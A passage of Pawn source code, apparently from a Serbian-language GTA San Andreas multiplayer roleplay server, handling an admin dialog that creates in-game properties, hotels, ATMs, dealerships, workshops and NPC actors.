	}
	else if( dialogid == dialog_CREATEVEH ) {
	    if( response ) {
	        switch( listitem ) {
				case 0: { SPD( playerid, dialog_VCREATE, DSI, D_NASLOV, "Unesite id zeljenog vozila, id boje1, id boje2!", D_ODABERI, D_NAZAD ); }
                
			}
	    }
	}
	else if( dialogid == dialog_NAPRAVISVE ) {
        if( response ) {
            switch( listitem ) {
			    case 0: {
			    	SPD( playerid, dialog_ORGCREATE, DSI, D_NASLOV, "Unesite zeljeno ime vase organizacije!", D_ODABERI, D_NAZAD ); }
				case 1: {
				    SPD( playerid, dialog_CREATEVEH, DSL, D_NASLOV, "Privatno vozilo", D_ODABERI, D_NAZAD ); }
				case 2: {
		        	SPD( playerid, dialog_FCREATE, DSI, D_NASLOV, "Unesite vrstu firme koju zelite.\nVrste: 0. 24/7 1. Burg 2. Cluckin Bell 3. Binco 4. Firma bez ulaza 5. Zip 6. Victim 7. Suburban\n8. Bar 9. Gym 10. Gun Shop 11. MRestoran 12. VRestoran 13. Pizza 14. Nocni klub\n 15. Disco 16. Electronic Shop 17. Trafika 18.Firma za posao 19. Rent firma 20. Pumpa 21. Javna Kuca 22. Kladionica\n23. Prazan Lokal 24. Casino", D_ODABERI, D_NAZAD ); }
		        case 3: {
		            for( new i = 1; i < MAX_KONT; i++ ) {
					    new fileauta[ 40 ];
						format(fileauta, sizeof( fileauta ), KO_FILE, i);
						if( !fexist( fileauta ) ) {
						    new Float:x, Float:y, Float:z, Float:angle;
							GetPlayerPos( playerid, x, y, z); GetPlayerFacingAngle( playerid, angle);
							KontInfo[ i ][ koObjPos ][ 0 ] = x;
		    				KontInfo[ i ][ koObjPos ][ 1 ] = y;
		    				KontInfo[ i ][ koObjPos ][ 2 ] = z;
		    				KontInfo[ i ][ koObjRot ][ 0 ] = 0;
		    				KontInfo[ i ][ koObjRot ][ 1 ] = 0;
		    				KontInfo[ i ][ koObjRot ][ 2 ] = 0;
							KontInfo[ i ][ koObjID ] = CreateDynamicObject(1345, x+2, y, z+0.6, 0.0, 0.0, angle);
                            Streamer_Update( playerid );
							EditDynamicObject( playerid, KontInfo[ i ][ koObjID ] ); EditKontejnera[ playerid ] = i;
						 	SacuvajKont( i );
						    break;
						}
					}
		        }
		        case 4: {
		            SPD( playerid, dialog_IMCREATE, DSI, D_NASLOV, "Unesite vrstu kuce koju zelite.\nVrste: 1. Mala kuca 2. Srednja Kuca 3. Velika kuca 4. PentHouse!", D_ODABERI, D_NAZAD ); }
		        case 5: {
		            new im = SledeciIDImovine( MAX_IMOVINA ), Float:PozX, Float:PozY, Float:PozZ, string[ 256 ], iimovine[ 40 ];
					GetPlayerPos( playerid, PozX, PozY, PozZ );
				    format( iimovine, sizeof( iimovine ), IM_FILE, im );
					if( fexist( iimovine ) ) return SendErrorMessage( playerid, "ID te imovine vec postoji!" );
				    II[ im ][ iUsage ] = IMOVINA_STAN;
				    II[ im ][ iExit ][ 0 ] = STAN_X;
		    		II[ im ][ iExit ][ 1 ] = STAN_Y;
		    		II[ im ][ iExit ][ 2 ] = STAN_Z;
				    II[ im ][ iPrice ] = STAN_PRICE;
				    II[ im ][ iInterior ] = STAN_INT;
				    II[ im ][ iVrsta ] = 0;
					II[ im ][ iOwned ] = 0;
                	II[ im ][ iNeaktivnost ] = 0;
					strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
					II[ im ][ iEnter ][ 0 ] = PozX;
					II[ im ][ iEnter ][ 1 ] = PozY;
				   	II[ im ][ iEnter ][ 2 ] = PozZ;
				    II[ im ][ iLocked ] = 0;
				    II[ im ][ iVW ] = im;
				    II[ im ][ iLevel ] = 3;
				    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
			    	II[ im ][ iOrmar ] = 0;
					II[ im ][ iSkin ][ 0 ] = 0;
					II[ im ][ iSkin ][ 1 ] = 0;
					II[ im ][ iSkin ][ 2 ] = 0;
					II[ im ][ iSafeStatus ] = 0; II[ im ][ iSafePass ] = 0;
					II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
					II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
					II[ im ][ iDrug ][ 0 ] = 0; II[ im ][ iDrug ][ 1 ] = 0; II[ im ][ iDrug ][ 2 ] = 0; II[ im ][ iDrug ][ 3 ] = 0; II[ im ][ iDrug ][ 4 ] = 0;
					II[ im ][ iDrug ][ 5 ] = 0; II[ im ][ iDrug ][ 6 ] = 0; II[ im ][ iDrug ][ 7 ] = 0; II[ im ][ iDrug ][ 8 ] = 0; II[ im ][ iDrug ][ 9 ] = 0;
					II[ im ][ iDrugCode ][ 0 ] = 0; II[ im ][ iDrugCode ][ 1 ] = 0; II[ im ][ iDrugCode ][ 2 ] = 0; II[ im ][ iDrugCode ][ 3 ] = 0; II[ im ][ iDrugCode ][ 4 ] = 0;
					II[ im ][ iDrugCode ][ 5 ] = 0; II[ im ][ iDrugCode ][ 6 ] = 0; II[ im ][ iDrugCode ][ 7 ] = 0; II[ im ][ iDrugCode ][ 8 ] = 0; II[ im ][ iDrugCode ][ 9 ] = 0;
		            II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0; II[ im ][ iPizzaTime ] = 0;
					SaveProperty( im );
				    format( string, sizeof( string ),""col_crvena"Stan na Prodaju"col_white"[ID %d]"col_crvena"\nCena: "col_white"%d$\n"col_crvena"Potreban level: "col_white"%d\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				    ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
				    ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
					SendInfoMessage( playerid, "Uspesno si kreirao stan." );
				}
				case 6: {
		            new im = SledeciIDImovine( MAX_IMOVINA ), Float:PozX, Float:PozY, Float:PozZ, string[ 256 ], iimovine[ 40 ];
					GetPlayerPos( playerid, PozX, PozY, PozZ );
				    format( iimovine, sizeof( iimovine ), IM_FILE, im );
					if( fexist( iimovine ) ) return SendErrorMessage( playerid, "ID te imovine vec postoji!" );
				    II[ im ][ iUsage ] = IMOVINA_VIKENDICA;
				    II[ im ][ iExit ][ 0 ] = VIKENDICA_X;
		    		II[ im ][ iExit ][ 1 ] = VIKENDICA_Y;
		    		II[ im ][ iExit ][ 2 ] = VIKENDICA_Z;
				    II[ im ][ iPrice ] = VIKENDICA_PRICE;
				    II[ im ][ iInterior ] = VIKENDICA_INT;
				    II[ im ][ iVrsta ] = 0;
					II[ im ][ iOwned ] = 0;
                	II[ im ][ iNeaktivnost ] = 0;
					strmid( II[ im ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
					II[ im ][ iEnter ][ 0 ] = PozX;
					II[ im ][ iEnter ][ 1 ] = PozY;
				   	II[ im ][ iEnter ][ 2 ] = PozZ;
				    II[ im ][ iLocked ] = 0;
				    II[ im ][ iVW ] = im;
				    II[ im ][ iLevel ] = 5;
				    strmid( II[ im ][ iAdress ], UlicaImovine( im ), 0, strlen( UlicaImovine( im ) ), 32);
				    II[ im ][ iOrmar ] = 0;
					II[ im ][ iSkin ][ 0 ] = 0;
					II[ im ][ iSkin ][ 1 ] = 0;
					II[ im ][ iSkin ][ 2 ] = 0;
					II[ im ][ iSafeStatus ] = 0; II[ im ][ iSafePass ] = 0;
					II[ im ][ iOruzje ][ 0 ] = 0; II[ im ][ iOruzje ][ 1 ] = 0; II[ im ][ iOruzje ][ 2 ] = 0; II[ im ][ iOruzje ][ 3 ] = 0;
					II[ im ][ iMunicija ][ 0 ] = 0; II[ im ][ iMunicija ][ 1 ] = 0; II[ im ][ iMunicija ][ 2 ] = 0; II[ im ][ iMunicija ][ 3 ] = 0;
					II[ im ][ iDrug ][ 0 ] = 0; II[ im ][ iDrug ][ 1 ] = 0; II[ im ][ iDrug ][ 2 ] = 0; II[ im ][ iDrug ][ 3 ] = 0; II[ im ][ iDrug ][ 4 ] = 0;
					II[ im ][ iDrug ][ 5 ] = 0; II[ im ][ iDrug ][ 6 ] = 0; II[ im ][ iDrug ][ 7 ] = 0; II[ im ][ iDrug ][ 8 ] = 0; II[ im ][ iDrug ][ 9 ] = 0;
					II[ im ][ iDrugCode ][ 0 ] = 0; II[ im ][ iDrugCode ][ 1 ] = 0; II[ im ][ iDrugCode ][ 2 ] = 0; II[ im ][ iDrugCode ][ 3 ] = 0; II[ im ][ iDrugCode ][ 4 ] = 0;
					II[ im ][ iDrugCode ][ 5 ] = 0; II[ im ][ iDrugCode ][ 6 ] = 0; II[ im ][ iDrugCode ][ 7 ] = 0; II[ im ][ iDrugCode ][ 8 ] = 0; II[ im ][ iDrugCode ][ 9 ] = 0;
		            II[ im ][ iDoorLevel ] = 0; II[ im ][ iAlarm ] = 0; II[ im ][ iLockLevel ] = 0; II[ im ][ iTime ] = 0; II[ im ][ iPizzaTime ] = 0;
					SaveProperty( im );
				    format( string, sizeof( string ),"{7B8000}Vikendica na Prodaju"col_white"[ID %d]{7B8000}\n{7B8000}Cena: "col_white"%d$\n{7B8000}Potreban level: "col_white"%d\n{7B8000}Adresa: "col_white"%s\n{7B8000}Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
				    ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
				    ImovinaPickup[ im ] = CreateDynamicPickup(1318, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
					SendInfoMessage( playerid, "Uspesno si kreirao vikendicu." );
				}
				case 7: {
				    new dFile[32];
				    if( PlayerCreateEvent[ playerid ] ) return SendErrorMessage( playerid, "Vec pravis event!");
					SPD( playerid, dialog_CREATEEVENT, DSI, D_NASLOV, "Unesite ime eventa", D_ODABERI, D_ODUSTANI );
					PlayerCreateEvent[ playerid ] = true;
					EventID[ playerid ] = 1;
					for( new id = 1; id <= MAX_EVENTS; id++ )
					{
						format( dFile, 35, EVENT_FILE, id );
						if( fexist( dFile ) ) EventID[ playerid ]++;
						if( EventID[ playerid ] > MAX_EVENTS ) return SendErrorMessage( playerid, "Vec je napravljen maksimalan broj eventa.");
					}
				}
				case 8: {
		            for( new i = 1; i < MAX_ATM; i++ ) {
					    new fileauta[ 40 ];
						format(fileauta, sizeof( fileauta ), ATM_FILE, i);
						if( !fexist( fileauta ) ) {
						    new Float:x, Float:y, Float:z, Float:angle;
							GetPlayerPos( playerid, x, y, z); GetPlayerFacingAngle( playerid, angle );
							atmInfo[ i ][ atmPos ][ 0 ] = x;
		    				atmInfo[ i ][ atmPos ][ 1 ] = y;
		    				atmInfo[ i ][ atmPos ][ 2 ] = z;
		    				atmInfo[ i ][ atmPos ][ 3 ] = 0;
		    				atmInfo[ i ][ atmPos ][ 4 ] = 0;
		    				atmInfo[ i ][ atmPos ][ 5 ] = 0;
		    				atmInfo[ i ][ atmExists ] = true;
							atmInfo[ i ][ atmObject ] = CreateDynamicObject( 2942, x+2, y, z+0.6, 0.0, 0.0, angle );
                            Streamer_Update( playerid );
							EditDynamicObject( playerid, atmInfo[ i ][ atmObject ] ); EditATM[ playerid ] = i;
						 	SacuvajATM( i );
						    break;
						}
					}
		        }
		        case 9: {
		            new as = SledeciIDSalona( MAX_AUTOS ), Float:PozX, Float:PozY, Float:PozZ, fautos[ 40 ];
					GetPlayerPos( playerid, PozX, PozY, PozZ );
				    format( fautos, sizeof( fautos ), AS_FILE, as );
					if( fexist( fautos ) ) return SendErrorMessage( playerid, "ID tog autosalona vec postoji!" );
					AutoSalon[ as ][ aPickupPos ][ 0 ] = PozX;
					AutoSalon[ as ][ aPickupPos ][ 1 ] = PozY;
					AutoSalon[ as ][ aPickupPos ][ 2 ] = PozZ;
					AutoSalon[ as ][ aVW ] = GetPlayerVirtualWorld( playerid );
					AutoSalon[ as ][ aInt ] = GetPlayerInterior( playerid );
					AutoSalon[ as ][ aIzlogVeh ] = 0;
					AutoSalon[ as ][ aVehBuyedPos ][ 0 ] = 0.0; AutoSalon[ as ][ aVehBuyedPos ][ 1 ] = 0.0; AutoSalon[ as ][ aVehBuyedPos ][ 2 ] = 0.0; AutoSalon[ as ][ aVehBuyedPos ][ 3 ] = 0.0;
					AutoSalon[ as ][ aCameraPos ][ 0 ] = 0.0; AutoSalon[ as ][ aCameraPos ][ 1 ] = 0.0; AutoSalon[ as ][ aCameraPos ][ 2 ] = 0.0;
					AutoSalon[ as ][ aCameraLookAt ][ 0 ] = 0.0; AutoSalon[ as ][ aCameraLookAt ][ 1 ] = 0.0; AutoSalon[ as ][ aCameraLookAt ][ 2 ] = 0.0;
					AutoSalon[ as ][ aVehModel ][ 0 ] = 0; AutoSalon[ as ][ aMaxVehModel ] = 0;
					AutoSalon[ as ][ aVehModel ][ 1 ] = 0; AutoSalon[ as ][ aVehModel ][ 2 ] = 0; AutoSalon[ as ][ aVehModel ][ 3 ] = 0;
					AutoSalon[ as ][ aVehModel ][ 4 ] = 0; AutoSalon[ as ][ aVehModel ][ 5 ] = 0; AutoSalon[ as ][ aVehModel ][ 6 ] = 0;
					AutoSalon[ as ][ aVehModel ][ 7 ] = 0; AutoSalon[ as ][ aVehModel ][ 8 ] = 0; AutoSalon[ as ][ aVehModel ][ 9 ] = 0;
					AutoSalon[ as ][ aVehModel ][ 10 ] = 0; AutoSalon[ as ][ aVehModel ][ 11 ] = 0; AutoSalon[ as ][ aVehModel ][ 12 ] = 0;
					AutoSalon[ as ][ aVehModel ][ 13 ] = 0; AutoSalon[ as ][ aVehModel ][ 14 ] = 0; AutoSalon[ as ][ aVehModel ][ 15 ] = 0;
                    AutoSalon[ as ][ aVehAmmount ][ 0 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 1 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 2 ] = 0;
                    AutoSalon[ as ][ aVehAmmount ][ 3 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 4 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 5 ] = 0;
                    AutoSalon[ as ][ aVehAmmount ][ 6 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 7 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 8 ] = 0;
                    AutoSalon[ as ][ aVehAmmount ][ 9 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 10 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 11 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 12 ] = 0;
                    AutoSalon[ as ][ aVehAmmount ][ 13 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 14 ] = 0; AutoSalon[ as ][ aVehAmmount ][ 15 ] = 0;
					SaveSalon( as );
					KreiranAutoSalon[ playerid ] = as;
					AutoSalon[ as ][ AutoSalon3D ] = CreateDynamic3DTextLabel( ""col_white"Da kupite vozilo kucajte\n"col_crvena"[ /kupivozilo ]", -1, AutoSalon[ as ][ aPickupPos ][ 0 ], AutoSalon[ as ][ aPickupPos ][ 1 ], AutoSalon[ as ][ aPickupPos ][ 2 ], 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, AutoSalon[ as ][ aVW ], AutoSalon[ as ][ aInt ], -1, 20.0);
				    AutoSalon[ as ][ AutoSalonPickup ] = CreateDynamicPickup( 1239, 1, AutoSalon[ as ][ aPickupPos ][ 0 ], AutoSalon[ as ][ aPickupPos ][ 1 ], AutoSalon[ as ][ aPickupPos ][ 2 ], AutoSalon[ as ][ aVW ], AutoSalon[ as ][ aInt ], -1, 20.0 );
					SPD( playerid, dialog_ASMAXMODEL, DSI, D_NASLOV, "Unesite broj razlicith vrsti vozila koja ce se nalaziti u salonu(3-16)", D_ODABERI, D_NAZAD );
				}
				case 10: {
		            new h = NextHotelID( MAX_HOTELS ), Float:PozX, Float:PozY, Float:PozZ, string[ 256 ], hfile[ 40 ];
					GetPlayerPos( playerid, PozX, PozY, PozZ );
				    format( hfile, sizeof( hfile ), HOTEL_FILE, h );
					if( fexist( hfile ) ) return SendErrorMessage( playerid, "ID te imovine vec postoji!" );
				    hotelInfo[ h ][ hExit ][ 0 ] = 2214.3848;
		    		hotelInfo[ h ][ hExit ][ 1 ] = -1150.5399;
		    		hotelInfo[ h ][ hExit ][ 2 ] = 1025.7969;
				    hotelInfo[ h ][ hPrice ] = 1000000;
				    hotelInfo[ h ][ hInterior ] = 15;
					hotelInfo[ h ][ hOwned ] = 0;
					strmid( hotelInfo[ h ][ hOwner], "Drzava", 0, strlen( "Drzava" ), 32);
					hotelInfo[ h ][ hEnter ][ 0 ] = PozX;
					hotelInfo[ h ][ hEnter ][ 1 ] = PozY;
				   	hotelInfo[ h ][ hEnter ][ 2 ] = PozZ;
				    hotelInfo[ h ][ hRoomPrice ] = 50;
				    hotelInfo[ h ][ hMoney ] = 0;
				    hotelInfo[ h ][ hVW ] = h;
				    hotelInfo[ h ][ hLocked  ] = 0;
				    hotelInfo[ h ][ hLevel ] = 5;
				    strmid( hotelInfo[ h ][ hAdress ], UlicaHotela( h ), 0, strlen( UlicaHotela( h ) ), 32);

				    strmid( hotelInfo[ h ][ hGuest_1 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    strmid( hotelInfo[ h ][ hGuest_2 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    strmid( hotelInfo[ h ][ hGuest_3 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    strmid( hotelInfo[ h ][ hGuest_4 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    strmid( hotelInfo[ h ][ hGuest_5 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    strmid( hotelInfo[ h ][ hGuest_6 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
				    strmid( hotelInfo[ h ][ hGuest_7 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
					strmid( hotelInfo[ h ][ hGuest_8 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
					strmid( hotelInfo[ h ][ hGuest_9 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
					strmid( hotelInfo[ h ][ hGuest_10 ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );

					SaveHotel( h );
				    format( string, sizeof( string ), "{36AB00}Hotel na Prodaju"col_white"[ID %d]{36AB00}\n{36AB00}Cena: "col_white"%d$\n{36AB00}Potreban level: "col_white"%d\n{36AB00}Adresa: "col_white"%s\n{36AB00}Za kupovinu "col_white"/kupihotel", h, hotelInfo[ h ][ hPrice ], hotelInfo[ h ][ hLevel ], hotelInfo[ h ][ hAdress ] );
				    hotelInfo[ h ][ h3DText ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, hotelInfo[ h ][ hEnter ][ 0 ], hotelInfo[ h ][ hEnter ][ 1 ], hotelInfo[ h ][ hEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
				    hotelInfo[ h ][ hPickup ] = CreateDynamicPickup( 19134, 1, hotelInfo[ h ][ hEnter ][ 0 ], hotelInfo[ h ][ hEnter ][ 1 ], hotelInfo[ h ][ hEnter ][ 2 ] );
					SendInfoMessage( playerid, "Uspesno si kreirao hotel." );
				}
				case 11: {
				    SPD( playerid, dialog_CREATEGATE, DSI, D_NASLOV, "Unesite id objekta kapije.", D_ODABERI, D_NAZAD );
				}
				case 12: {
				    SendErrorMessage(playerid, "Onemoguceno!");
				}
				case 13: {
				    SPD( playerid, dialog_CREATEGARAGE, DSL, D_NASLOV, "Mala garaza\nSrednja garaza\nVelika garaza", D_ODABERI, D_NAZAD );
				}
				case 14: {
				    SPD( playerid, dialog_CREATEGPS, DSI, D_NASLOV, "Unesite ime ovog mesta za gps.", D_ODABERI, D_NAZAD );
				}
				case 15: {
                    SendErrorMessage(playerid, "Onemoguceno!");
				}
				case 16: {
				    SPD( playerid, dialog_GANGZCOLOR, DSI, D_NASLOV, "Unesite boju za gang zonu.\nPrimer: FF2244", D_ODABERI, D_NAZAD );
				}
				case 17: {

                    new idrent = NextRentLocationID(MAX_RENTL);
                    if(idrent == -1) return SendErrorMessage(playerid, "Vec ima maksimalni broj Rent Lokacija");

                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(playerid, X, Y, Z);
                    new string[180];
                    
                    RentInfo[idrent][rPosX] = X; 
                    RentInfo[idrent][rPosY] = Y; 
                    RentInfo[idrent][rPosZ] = Z;

                    format(string, 220, ""col_crvena"[ RENT VOZILA ]\nID: "col_white"%d\n"col_crvena"[ /rent ]", idrent);
                    RentLabel[idrent] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, X, Y, Z, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
                    RentPickup[idrent] = CreateDynamicPickup(19135, 1, X, Y, Z, -1, -1, -1, 30.0, -1, 0);

                    SacuvajRentLokacije(idrent);
                    
                    va_SendClientMessage(playerid, 0xF81414FF, "(Server): {FFFFFF}Rent Lokacija je uspesno kreirana, ID : %d!", idrent);

				}
                case 18: {
                    SPD(playerid, dialog_ActorKreiraj, DSI, D_NASLOV, "Unesite: IDActora Skin Ime", D_ODABERI, D_NAZAD);
                }
                case 19: {
                    SPD(playerid, dialog_PlantazaKreiraj, DSI, D_NASLOV, "Unesite ID", D_ODABERI, D_NAZAD);
                }
                case 20: {

                    new id = NextBitCoinWorkShopID(MAX_BTCW);

                    if( id == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalni broj BitCoin Workshop-ova." );
                    
                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(playerid, X, Y, Z);

                    strmid(BitcoinInfo[id][bVlasnik],"Niko",0,strlen("Niko"),255);
                    BitcoinInfo[id][bNovac] = 0;
                    BitcoinInfo[id][bMasine] = 1;
                    BitcoinInfo[id][bUlazX] = X;
                    BitcoinInfo[id][bUlazY] = Y;
                    BitcoinInfo[id][bUlazZ] = Z;
                    BitcoinInfo[id][bIzlazX] = 2318.5020;
                    BitcoinInfo[id][bIzlazY] = -1786.4697;
                    BitcoinInfo[id][bIzlazZ] = 1600.7520;
                    BitcoinInfo[id][bPokvareno] = 0;
                    SacuvajBTCWorkShop(id);

                    new string[220];
                    format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"NIKO\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Cena: "col_white"%d$\n"SRVBOJA1SCM"Da kupis bitcoin workshop koristi /kupiworkshop", id, BTCWORKSHOP_PRICE);
                    BitCoinLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
                    BitCoinPickup[id] = CreateDynamicPickup(18631, 1, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
                }
                case 21: {

                    //return SendErrorMessage(playerid, "Koristi /server -> Napravi -> Vozilo");
                    SPD(playerid, dialog_NapraviOrgVehPickupColor, DIALOG_STYLE_LIST, "Odaberi boju vozila", "Crna\nBela\nCrvena\nZuta\nRoze\nPlava\nLjubicasta\nZelena\nSvetlo Plava", "Odaberi", "Odustani");
                    //ShowPlayerDialog(playerid, dialog_NapraviOrgVehPickup, DIALOG_STYLE_INPUT, "Kreiranje Org Veh Pickup", "Unesite ID organizacije kojoj vozila pripadaju", "Potvrdi", "Odustani");
                }
                case 22: {

                    new id = SledeciIDWorkShop(MAX_WORKSHOPS);

                    if(id == -1) return SendErrorMessage(playerid, "Imas maksimalno kreiranih workshop-ova!");

                    new Float:x, Float:y, Float:z;
                    GetPlayerPos( playerid, x, y, z);

                    WorkShopInfo[id][wPosX] = x;
                    WorkShopInfo[id][wPosY] = y;
                    WorkShopInfo[id][wPosZ] = z;

                    WorkShopInfo[id][wBrojAuta] = 0;
                    WorkShopInfo[id][wBrojDelova] = 0;

                    WorkShopInfo[id][wModel1] = 0;
                    WorkShopInfo[id][wModel2] = 0;
                    WorkShopInfo[id][wPopravka1] = 0;
                    WorkShopInfo[id][wPopravka2] = 0;

                    WorkShopInfo[id][wBrojRadnika] = 0;

                    strmid( WorkShopInfo[id][wVlasnik], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );

                    SaveWorkShop(id);

                    WorkShopVehicleCheck(id);

                    WorkShopLabelUpdate(id);

                    SendInfoMessage(playerid, "Uspesno si napravio WorkShop!");

                    return 1;
                }
                case 23: {

                    return SendErrorMessage(playerid, "Iskljuceno!");

                    // new i = NextNargilaID(sizeof(NargilaInfo)), Float:X,Float:Y,Float:Z;
                    // GetPlayerPos(playerid, X,Y,Z);
                    // NargilaInfo[ i ][ nargilaID ] = CreateDynamicObject(2726, X, Y, Z, 0.0, 0.0, 0.0);
                    // EditDynamicObject(playerid, NargilaInfo[ i ][ nargilaID ]);
                    // KreiraNargilu[ playerid ] = i;
                    // SendClientMessage(playerid, -1, "Zapoceli ste kreiranje nargile.");
                    // NargilaInfo[ i ][ IznajmioNargilu ] = -1;

                    // return 1;
                }
                case 24: {

                    ShowPlayerDialog(playerid, dialog_portCreateVrsta, DIALOG_STYLE_LIST, "Odaberite Vrstu", "Vazne Lokacije\nPoslovi", "Odaberi", "Odustani");

                    return 1;
                }
                case 25: {

                    new id = getNextSlutID(MAX_SLUTS);
                    if(id == -1) return SendErrorMessage(playerid, "Imas maksimalan broj kreiranih kurvi!");

                    new Float:slutPos[3];
                    GetPlayerPos(playerid, slutPos[0], slutPos[1], slutPos[2]);

                    slutInfo[id][slutPosX] = slutPos[0];
                    slutInfo[id][slutPosY] = slutPos[1];
                    slutInfo[id][slutPosZ] = slutPos[2];

                    SaveSluts(id);

                    new String: string = str_format(""SRVBOJA1SCM"Kurva ID: %d\n"col_red"Koristi : /slut", id);
                    slutActor[id] = CreateDynamicActor(178, slutInfo[id][slutPosX], slutInfo[id][slutPosY], slutInfo[id][slutPosZ], 0, 1, 100, 0, 0, -1, 40.0, -1, 0);
                    slutLabel[id] = pp_CreateDynamic3DTextLabel(string, 0x33CCFFAA, slutInfo[id][slutPosX], slutInfo[id][slutPosY], slutInfo[id][slutPosZ]+1.0, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
                    slutMapIcon[id] = CreateDynamicMapIcon(slutInfo[id][slutPosX], slutInfo[id][slutPosY], slutInfo[id][slutPosZ], 12, BELA, -1, -1, -1, 300.0);

                    va_SendClientMessage(playerid, 0xF81414FF, "(Server): {FFFFFF}Kurva je uspesno kreirana, ID : %d!", id);

                    return 1;
                }
                case 26: {

                    new id = NextNaftnaPlatformaID(MAX_PLATFORMI);

                    if( id == -1 ) return SendErrorMessage( playerid, "Vec ima maksimalni broj Naftnih platformi." );

                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(playerid, X, Y, Z);

                    strmid(NaftaInfo[id][pVlasnik],"Niko",0,strlen("Niko"),255);
                    NaftaInfo[id][pNovac] = 0;
                    NaftaInfo[id][pUlazX] = X;
                    NaftaInfo[id][pUlazY] = Y;
                    NaftaInfo[id][pUlazZ] = Z;
                    SacuvajNaftnuPlatformu(id);

                    new string[220];
                    format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"NIKO\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Cena: "col_white"%d$\n"PLATFORMACOLOR"Da kupis naftnu platformu koristi /kupiplatformu", id, NAFTNAPLATFORMA_PRICE);
                    NaftaLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
                    NaftaPickup[id] = CreateDynamicPickup(18631, 1, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

                    va_SendClientMessage(playerid, 0xF81414FF, "(Server): {FFFFFF}Naftna Platforma je uspesno kreirana, ID : %d!", id);

                    return 1;
                }
			}
		}
